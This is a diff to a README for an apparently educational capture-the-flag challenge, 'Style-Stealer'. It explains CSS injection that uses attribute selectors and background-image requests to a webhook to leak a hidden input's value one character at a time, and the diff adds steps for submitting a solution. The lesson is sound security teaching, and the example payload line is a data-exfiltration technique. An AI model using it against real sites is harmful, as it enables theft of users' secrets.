@@ -12,9 +12,11 @@ A Webhook is a mechanism that allows data to be sent to a unique URL when certai
 In our challenge `Style-Stealer`, we assume that a secret is stored in an element such as `<input value="secret">`. The idea is to then inject something like `[value="a"] { background: url(webhook/a); }`, which targets an HTML element with a value attribute equal to "a". If such an element exists, the browser will attempt to load a background image from `webhook/a`, effectively making a request to your webhook URL. Although there's no actual image, the request itself logs the data access. Make sure to replace `"webhook"` with your own unique webhook URL.
 
 To expand this attack, rather than guessing exact values, you can use partial attribute selectors:
+
 `[value^="a"]`
 - `^` means first character
     - matches all HTML elements that start with "a"
+
 `[value$="a"]`
 - `$` means last character
     - matches all HTML elements that end with "a"
@@ -32,6 +34,20 @@ The following challenges in increasing difficulty are deployed to [platform.acmc
 - `style-stealer-5`
 - `style-stealer-6`
 - `style-stealer-100`
+
+### Solving and Submitting
+
+1. Go to the [style-stealer site](https://style-stealer.acmcyber.com/)
+2. Generate your script.
+3. Paste your script into the big CSS box.
+4. Put your desired level into the small Level (1-6, 100)
+5. Submit
+6. Test
+    - On the blank page, click "View style".
+    - See if the letter(s) that are displayed match the letter(s) logged on your webhook.
+7. Copy the URL and DM r2uwu2 on Discord.
+8. Once he opens your page, you should get a visit to your webhook with the letter(s) logged there.
+9. If the letters match, he will give you the flag. 
 
 ## Resources
 
